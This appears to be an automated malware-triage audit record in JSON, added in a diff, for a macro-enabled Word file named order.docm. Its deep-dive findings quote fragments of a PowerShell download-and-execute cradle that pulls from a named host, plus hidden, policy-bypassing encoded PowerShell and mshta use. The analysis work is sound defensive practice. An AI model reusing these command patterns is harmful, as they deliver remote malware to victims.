@@ -1,0 +1,980 @@
+{
+  "sha": "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
+  "mode": "single",
+  "mode_effective": "large",
+  "strict_standard": false,
+  "audited_at": "2026-08-09T20:19:11.544306+00:00",
+  "session_pipeline_mode": "document",
+  "sample_path": "/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
+  "stages": {
+    "intake": {
+      "ok": true,
+      "checks": {
+        "intake_validation": true,
+        "has_source_decisions": true,
+        "ghidra_mentioned": true
+      },
+      "evidence": {
+        "intake_validation": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-validation.json",
+          "exists": true,
+          "bytes": 721,
+          "mtime_iso": "2026-08-09T20:04:20.869597+00:00",
+          "sha256": "54c541f25c80093f95203c10c16d8b0c254408364188d5460824d0bba067318c"
+        },
+        "malcat_triage": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/malcat-triage.json",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "source_decisions": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/source-decisions.json",
+          "exists": true,
+          "bytes": 638,
+          "mtime_iso": "2026-08-09T20:04:20.869597+00:00",
+          "sha256": "b0f5d184b0666101d0d8646dbcea414c28a2c2e54fc05bd39c5a6d774fb0cac0"
+        },
+        "ghidra_import_log": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-analyzeHeadless.log",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "ida_bootstrap_log": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-idasql.log",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "source_decisions_excerpt": "{\n  \"sha256\": \"385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\",\n  \"format\": \"ooxml\",\n  \"imports\": {\n    \"source\": \"none\",\n    \"confidence\": \"high\",\n    \"reason\": \"document format: no PE imports (doc_triage used)\"\n  },\n  \"functions\": {\n    \"source\": \"none\",\n    \"confidence\": \"high\",\n    \"reason\": \"document format: no functions (doc_triage used)\"\n  },\n  \"strings\": {\n    \"source\": \"doc_triage\",\n    \"confidence\": \"medium\",\n    \"reason\": \"doc_triage string/flag extraction\"\n  },\n  \"decompilation\": {\n    \"source\": \"none\",\n    \"confidence\": \"high\",\n    \"reason\": \"document format: no decompilation (doc_triage used)\"\n  }\n}",
+        "malcat_triage_excerpt": ""
+      }
+    },
+    "quick_scan": {
+      "ok": true,
+      "checks": {
+        "prompt": true,
+        "verdict": true,
+        "has_capa_section": true,
+        "has_yara_section": true,
+        "has_malcat_section": true,
+        "has_floss_section": true,
+        "verdict_has_family": true,
+        "llm_source": true,
+        "tools_all_ok": true,
+        "citations_grounded": true,
+        "capa_salvage_used": false,
+        "evidence_pack_present": true,
+        "benign_blocked_if_incomplete": true,
+        "yara_family_not_cleared": true
+      },
+      "tools": {
+        "capa": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": "{\n  \"skipped\": true,\n  \"fail_open\": true,\n  \"reason\": \"not_applicable:ooxml\",\n  \"error\": \"CAPA supports PE/ELF/Mach-O only (got ooxml)\",\n  \"rule_count\": 0,\n  \"matched_rule_count\": 0,\n  \"top_rules\": []\n}",
+          "present": true
+        },
+        "yara": {
+          "ok": true,
+          "why": "ok",
+          "raw_excerpt": "{\n  \"rule_count\": 6,\n  \"matches\": [\n    {\n      \"rule\": \"domain\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$domain_regex\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"IP\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$ipv6\",\n          \"offset\": 7394,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"docx_macro\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$header\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$vbaStrings\",\n          \"offset\": 8137,\n          \"length\": 19,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"contains_base64\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$a\",\n          \"offset\": 471,\n          \"length\": 12,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"Contains_VBA_macro_code\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$zipmagic\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr1\",\n          \"offset\": 8142,\n          \"length\": 14,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr2\",\n          \"offset\": 7531,\n          \"length\": 11,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"office_document_vba\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$zipmagic\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr1\",\n          \"offset\": 8142,\n          \"length\": 14,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr2\",\n          \"offset\": 7531,\n          \"length\": 11,\n          \"xor_key\": null\n        }\n      ]\n    }\n  ],\n  \"engine\": \"yara-x\",\n  \"rules_compiled\": 454,\n  \"compile_errors\": [\n    \"/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\\n  |\\n6 | import \\\"androguard\\\"\\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found\",\n    \"/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\\n   |\\n11 | import \\\"androguard\\\"\\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found\",\n    \"/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\\n   |\\n54 |          and is__elf\\n   |              ^^^^^^^ this identifier has not been declared\",\n    \"/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\\n   |\\n10 | import\n\u2026 [1694 more chars]",
+          "present": true
+        },
+        "floss": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": "{\n  \"skipped\": true,\n  \"fail_open\": true,\n  \"reason\": \"not_applicable:ooxml\",\n  \"error\": \"FLOSS supports PE only (got ooxml)\",\n  \"string_count\": 0,\n  \"strings\": []\n}",
+          "present": true
+        },
+        "malcat": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": "{\n  \"analysis_id\": 1,\n  \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"profile\": \"deep\",\n  \"limits\": {\n    \"strings_max\": 300,\n    \"imports_max\": 300,\n    \"functions_max\": 30,\n    \"anomaly_locations_max\": 50,\n    \"decompile_top_n\": 3\n  },\n  \"file_summary\": {\n    \"analysis_id\": 1,\n    \"file_name\": \"order.docm\",\n    \"file_path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n    \"file_size\": 22771,\n    \"type\": \"ZIP\",\n    \"architecture\": \"NONE\",\n    \"entropy\": 215,\n    \"sha256\": \"385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\",\n    \"metadata\": {},\n    \"entrypoint_ea\": null,\n    \"layout\": [\n      {\n        \"name\": \"[Content_Types].xml\",\n        \"effective_address\": 0,\n        \"physical_size\": 441,\n        \"virtual_size\": 441,\n        \"rights\": \"R\",\n        \"entropy\": 219\n      },\n      {\n        \"name\": \"app.xml\",\n        \"effective_address\": 441,\n        \"physical_size\": 498,\n        \"virtual_size\": 498,\n        \"rights\": \"R\",\n        \"entropy\": 224\n      },\n      {\n        \"name\": \"core.xml\",\n        \"effective_address\": 939,\n        \"physical_size\": 406,\n        \"virtual_size\": 406,\n        \"rights\": \"R\",\n        \"entropy\": 222\n      },\n      {\n        \"name\": \"document.xml\",\n        \"effective_address\": 1345,\n        \"physical_size\": 1208,\n        \"virtual_size\": 1208,\n        \"rights\": \"R\",\n        \"entropy\": 221\n      },\n      {\n        \"name\": \"fontTable.xml\",\n        \"effective_address\": 2553,\n        \"physical_size\": 523,\n        \"virtual_size\": 523,\n        \"rights\": \"R\",\n        \"entropy\": 218\n      },\n      {\n        \"name\": \"settings.xml\",\n        \"effective_address\": 3076,\n        \"physical_size\": 1385,\n        \"virtual_size\": 1385,\n        \"rights\": \"R\",\n        \"entropy\": 221\n      },\n      {\n        \"name\": \"styles.xml\",\n        \"effective_address\": 4461,\n        \"physical_size\": 3035,\n        \"virtual_size\": 3035,\n        \"rights\": \"R\",\n        \"entropy\": 208\n      },\n      {\n        \"name\": \"vbaData.xml\",\n        \"effective_address\": 7496,\n        \"physical_size\": 611,\n        \"virtual_size\": 611,\n        \"rights\": \"R\",\n        \"entropy\": 225\n      },\n      {\n        \"name\": \"vbaProject.bin\",\n        \"effective_address\": 8107,\n        \"physical_size\": 4985,\n        \"virtual_size\": 4985,\n        \"rights\": \"R\",\n        \"entropy\": 221\n      },\n      {\n        \"name\": \"webSettings.xml\",\n        \"effective_address\": 13092,\n        \"physical_size\": 338,\n        \"virtual_size\": 338,\n        \"rights\": \"R\",\n        \"entropy\": 220\n      },\n      {\n        \"name\": \"image1.jpeg\",\n        \"effective_address\": 13430,\n        \"physical_size\": 5889,\n        \"virtual_size\": 5889,\n        \"rights\": \"R\",\n        \"entropy\": 223\n      },\n      {\n        \"name\": \"theme1.xml\",\n        \"effective_address\": 19319,\n        \"physical_size\": 1583,\n        \"virtual_size\": 1583,\n        \"rights\": \"R\",\n        \"entropy\": 220\n      },\n      {\n        \"name\": \"document.xml.rels\",\n        \"effective_address\": 20902,\n        \"physical_size\": 352,\n        \"virtual_size\": 352,\n        \"rights\": \"R\",\n        \"entropy\": 214\n      },\n      {\n        \"name\": \"vbaProject.bin.rels\",\n        \"effective_address\": 21254,\n        \"physical_size\": 245,\n        \"virtual_size\": 245,\n        \"rights\": \"R\",\n        \"entropy\": 207\n      },\n      {\n        \"name\": \".rels\",\n        \"effective_address\": 21499,\n        \"physical_size\": 274\n\u2026 [31083 more chars]",
+          "present": true
+        }
+      },
+      "citations": {
+        "ok": true,
+        "checked": 6,
+        "hits": 6,
+        "misses": [],
+        "hit_examples": [
+          "docx_macro yara matches Rule matched indicating the presence of VBA macro code in the document, a common vector for mali",
+          "Contains_VBA_macro_code yara matches Confirms the document contains VBA macro code, supporting the likelihood of executa",
+          "contains_base64 yara matches Base64 encoded strings detected, which may be used for obfuscation in malicious macros to e",
+          "domain yara matches Domain-related string found, potentially indicating command and control (C2) communication or data e",
+          "IP yara matches IP address string found, suggesting network activity that could be associated with malicious infrastruct"
+        ],
+        "reason": ""
+      },
+      "format": "ooxml",
+      "required_tools": [
+        "yara"
+      ],
+      "verdict_preview": {
+        "verdict": "suspicious",
+        "family": "generic macro malware",
+        "score": 60,
+        "agreement": "llm_v1_disagree",
+        "source": "llm_judge",
+        "model": "mimo-v2.5-pro",
+        "key_evidence": [
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "docx_macro",
+            "why": "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "Contains_VBA_macro_code",
+            "why": "Confirms the document contains VBA macro code, supporting the likelihood of executable content."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "contains_base64",
+            "why": "Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "domain",
+            "why": "Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "IP",
+            "why": "IP address string found, suggesting network activity that could be associated with malicious infrastructure."
+          },
+          {
+            "source": "malcat",
+            "query_or_table": "malcat deep profile",
+            "row_or_rule": "file_summary",
+            "why": "File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechanism for malware."
+          }
+        ],
+        "summary": "The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified."
+      },
+      "evidence": {
+        "prompt": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/prompt.txt",
+          "exists": true,
+          "bytes": 11701,
+          "mtime_iso": "2026-08-09T16:09:21.770912+00:00",
+          "sha256": "6971e9c86de558ffec98d0a0ae80958386c75ee1f7785f39f0ff0ede4de9965d"
+        },
+        "verdict": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/verdict.json",
+          "exists": true,
+          "bytes": 4080,
+          "mtime_iso": "2026-08-09T16:10:30.417610+00:00",
+          "sha256": "401a1ac5abb5e0a39b61157c1f30bffd024b5e14d11fd3d0e85ba1d72b3bdd52"
+        },
+        "prompt_excerpt": "# Triage evidence\nsha256: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\nsample_path: /opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\nghidra_session: doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\nida_session: (not loaded)\n\n## Ghidra SQL (capped)\n### engine: ghidra\nlabel: Total function count (Ghidra)\nsql: SELECT count(*) AS funcs FROM funcs\nerror: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)\n\n### engine: ghidra\nlabel: Total string count (Ghidra)\nsql: SELECT count(*) AS strings FROM strings\nerror: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)\n\n### engine: ghidra\nlabel: Imports (Ghidra) from data_items\nsql: SELECT name, address FROM data_items WHERE name LIKE 'PTR_%' LIMIT 50\nerror: session doc-ooxml-385966f3d6be7b234a790e2d\n\u2026 [10687 more chars]",
+        "verdict_excerpt": "{\n  \"verdict\": \"suspicious\",\n  \"score\": 60,\n  \"family_guess\": \"generic macro malware\",\n  \"cross_engine_notes\": \"Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.\",\n  \"key_evidence\": [\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"docx_macro\",\n      \"why\": \"Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"Contains_VBA_macro_code\",\n      \"why\": \"Confirms the document contains VBA macro code, supporting the likelihood of executable content.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n     \n\u2026 [3080 more chars]"
+      }
+    },
+    "deep_dive": {
+      "ok": true,
+      "checks": {
+        "01_tools_raw": true,
+        "00_sql_evidence": false,
+        "03_prompt": false,
+        "04_llm": false,
+        "05_deep": true,
+        "tools_all_ok": true,
+        "llm_source": false,
+        "citations_grounded": true,
+        "engine_citation_ok": true,
+        "upx_second_pass_ok": true,
+        "no_incomplete_tooling": true,
+        "confidence_sane": true,
+        "evidence_pack_present": true,
+        "depth_coverage": true,
+        "agentic_json": true,
+        "sql_deep_re": true,
+        "complete_verdict": true,
+        "not_incomplete": true,
+        "checklist_ok_flag": true,
+        "agentic_confidence_sane": true
+      },
+      "tools": {
+        "malcat": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "capa": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "pe_imports": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "yara": {
+          "ok": true,
+          "why": "ok",
+          "raw_excerpt": "{\n  \"rule_count\": 6,\n  \"matches\": [\n    {\n      \"rule\": \"domain\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$domain_regex\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"IP\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$ipv6\",\n          \"offset\": 7394,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"docx_macro\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$header\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$vbaStrings\",\n          \"offset\": 8137,\n          \"length\": 19,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"contains_base64\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$a\",\n          \"offset\": 471,\n          \"length\": 12,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"Contains_VBA_macro_code\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$zipmagic\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr1\",\n          \"offset\": 8142,\n          \"length\": 14,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr2\",\n          \"offset\": 7531,\n          \"length\": 11,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"office_document_vba\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$zipmagic\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr1\",\n          \"offset\": 8142,\n          \"length\": 14,\n          \"xor_key\": null\n        },\n        {\n          \"id\": \"$xmlstr2\",\n          \"offset\": 7531,\n          \"length\": 11,\n          \"xor_key\": null\n        }\n      ]\n    }\n  ],\n  \"engine\": \"yara-x\",\n  \"rules_compiled\": 454,\n  \"compile_errors\": [\n    \"/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\\n  |\\n6 | import \\\"androguard\\\"\\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found\",\n    \"/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\\n   |\\n11 | import \\\"androguard\\\"\\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found\",\n    \"/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\\n   |\\n54 |          and is__elf\\n   |              ^^^^^^^ this identifier has not been declared\",\n    \"/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\\n   |\\n10 | import\n\u2026 [1672 more chars]"
+        },
+        "floss": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "dotnet": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "r2_decomp": {
+          "ok": true,
+          "why": "ok",
+          "raw_excerpt": "{\n  \"r2_ok\": true,\n  \"sample\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"disassembly\": {\n    \"0x00000000\": \"\\u250c 94: fcn.00000000 (int64_t arg1, int64_t arg4);\\n\\u2502           ; arg int64_t arg1 @ rdi\\n\\u2502           ; arg int64_t arg4 @ rcx\\n\\u2502           0x00000000      50             push rax\\n\\u2502           0x00000001      4b030414       add rax, qword [r12 + r10]\\n\\u2502           0x00000005      0000           add byte [rax], al\\n\\u2502           0x00000007      0008           add byte [rax], cl\\n\\u2502           0x00000009      0000           add byte [rax], al\\n\\u2502           0x0000000b      0021           add byte [rcx], ah          ; arg4\\n\\u2502           0x0000000d      005bc3         add byte [rbx - 0x3d], bl\\n\\u2502           0x00000010      0c0c           or al, 0xc\\n\\u2502           0x00000012      8801           mov byte [rcx], al          ; arg4\\n\\u2502       \\u254e   0x00000014      0000           add byte [rax], al\\n\\u2502      \\u250c\\u2500\\u2500< 0x00000016      e105           loope 0x1d\\n\\u2502      \\u2502\\u254e   0x00000018      0000           add byte [rax], al\\n\\u2502      \\u2502\\u254e   0x0000001a      1300           adc eax, dword [rax]\\n\\u2502      \\u2502\\u254e   0x0000001c  ~   0000           add byte [rax], al\\n\\u2502      \\u2514\\u2500\\u2500> 0x0000001d      005b43         add byte [rbx + 0x43], bl\\n\\u2502       \\u254e   0x00000020      6f             outsd dx, dword [rsi]\\n\\u2502       \\u254e   0x00000021      6e             outsb dx, byte [rsi]\\n\\u2502      \\u250c\\u2500\\u2500< 0x00000022      7465           je 0x89\\n\\u2502      \\u2502\\u254e   0x00000024      6e             outsb dx, byte [rsi]\\n\\u2502     \\u250c\\u2500\\u2500\\u2500< 0x00000025      745f           je 0x86\\n\\u2502     \\u2502\\u2502\\u254e   0x00000027      54             push rsp\\n\\u2502    \\u250c\\u2500\\u2500\\u2500\\u2500< 0x00000028      7970           jns 0x9a\\n\\u2502   \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500< 0x0000002a      65735d         jae 0x8a\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500< 0x0000002d      2e786d         js 0x9d\\n\\u2502 \\u2502\\u254e\\u2502\\u2502\\u2502\\u2502\\u254e   0x00000030      6c             insb byte [rdi], dx\\n\\u2502 \\u2502\\u254e\\u2502\\u2502\\u2502\\u2502\\u254e   0x00000031      b554           mov ch, 0x54                ; 'T'\\n\\u2502 \\u2502\\u254e\\u2502\\u2502\\u2502\\u2502\\u254e   0x00000033      4b4fc3         ret\\n..\\n  \\u2502\\u254e\\u2502\\u2502\\u2502\\u2502\\u254e   ; DATA XREF from fcn.00000000 @ 0x31(r)\\n\\u2502 \\u2502\\u2502\\u2502\\u2502\\u2514\\u2500\\u2500\\u2500> 0x00000086      c5             invalid\\n..\\n\\u2502 \\u2502\\u2502\\u2502\\u2502 \\u2514\\u2500\\u2500> 0x00000089  ~   b8181d1e0c     mov eax, 0xc1e1d18          ; '\\\\x18\\\\x1d\\\\x1e\\\\f'\\n\\u2502 \\u2502\\u2502\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500> 0x0000008a      181d1e0c272b   sbb byte [0x2b270cae], bl\\n\\u2502 \\u2502\\u2502 \\u2502      0x00000090      8f             invalid\\n..\\n\\u2502 \\u2502\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500> 0x0000009a  ~   29a39aa38158   sub dword [rbx + 0x5881a39a], esp ; [0x5881a39a:4]=-1\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500> 0x0000009d      a38158388f..   movabs dword [0xbb52b968f385881], eax ; [0xbb52b968f385881:4]=-1\\n\\u2514       \\u2502   0x000000a6      06             invalid\"\n  },\n  \"engine\": \"pdf (disasm)\",\n  \"fallback\": true,\n  \"functions_attempted\": [\n    \"0x00000000\"\n  ]\n}"
+        },
+        "upx": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "xor": {
+          "ok": true,
+          "why": "ok",
+          "raw_excerpt": "{\n  \"xorsearch_ok\": false,\n  \"sample\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"candidates\": [],\n  \"xorsearch_stdout\": \"\",\n  \"xorsearch_stderr\": \"\",\n  \"xorsearch_returncode\": 1\n}"
+        },
+        "speakeasy": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "frida_probe": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        },
+        "frida_trace": {
+          "ok": true,
+          "why": "not_applicable:ooxml",
+          "raw_excerpt": null
+        }
+      },
+      "citations": {
+        "ok": true,
+        "checked": 8,
+        "hits": 8,
+        "misses": [],
+        "hit_examples": [
+          "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
+          "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payl",
+          "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
+          "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
+          "Malcat rData strings: multiple base64-encoded command strings"
+        ],
+        "reason": ""
+      },
+      "engine_citation": {
+        "ok": true,
+        "checked": 0,
+        "false_engine_citations": [],
+        "reason": "",
+        "corrections": {
+          "corrected": 0,
+          "corrections": []
+        }
+      },
+      "upx_second_pass": {
+        "applicable": false,
+        "ok": true,
+        "reason": "upx_not_unpacked"
+      },
+      "depth_coverage": {
+        "ok": true,
+        "missing": [],
+        "covered": {
+          "persistence": true,
+          "c2_network": true,
+          "evasion_anti_analysis": true,
+          "exfiltration": true,
+          "defense_impairment": true,
+          "credential_access": true,
+          "encryption_obfuscation": true,
+          "entry_point": true,
+          "imports": true,
+          "strings": true
+        },
+        "domain_count": 10
+      },
+      "format_routing": "ooxml",
+      "required_tools": [
+        "yara",
+        "r2_decomp",
+        "xor"
+      ],
+      "deep_preview": {
+        "source": "deep_dive_agentic",
+        "confidence": 90,
+        "summary": "Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execut",
+        "key_evidence": [
+          "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
+          "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload",
+          "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
+          "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
+          "Malcat rData strings: multiple base64-encoded command strings",
+          "YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP",
+          "Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project",
+          "File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"
+        ],
+        "model": null,
+        "llm_audit": null
+      },
+      "evidence": {
+        "tools_raw": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/01-tools-raw.json",
